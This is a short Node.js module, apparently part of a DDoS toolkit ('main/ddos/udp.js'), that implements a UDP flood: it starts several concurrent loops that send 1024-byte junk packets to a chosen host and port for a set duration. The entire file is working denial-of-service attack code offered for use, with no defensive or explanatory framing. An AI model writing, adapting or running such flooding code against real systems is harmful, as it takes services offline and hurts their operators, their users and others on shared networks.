// main/ddos/udp.js
const dgram = require('dgram');

async function udpFlood(target, duration, intensity = 10) {
  const url = new URL(target);
  const hostname = url.hostname;
  const port = url.port || 80;

  const startTime = Date.now();

  for (let i = 0; i < intensity; i++) {
    flood(hostname, port, duration, startTime);
  }

  console.log(`UDP flood started against ${target} with intensity ${intensity}`);
  await new Promise(resolve => setTimeout(resolve, duration * 1000));
  console.log(`UDP flood finished against ${target}`);
}

async function flood(hostname, port, duration, startTime) {
  while (Date.now() - startTime < duration * 1000) {
    try {
      const socket = dgram.createSocket('udp4');
      const message = Buffer.alloc(1024, 'A');

      socket.send(message, port, hostname, (err) => {
        if (err) {
          console.error(`UDP send error: ${err}`);
        }
        socket.close();
      });
    } catch (error) {
      console.error(`Error creating or sending UDP packet: ${error}`);
    }
    await new Promise(resolve => setTimeout(resolve, 0)); // Prevent blocking
  }
}

module.exports = { udpFlood };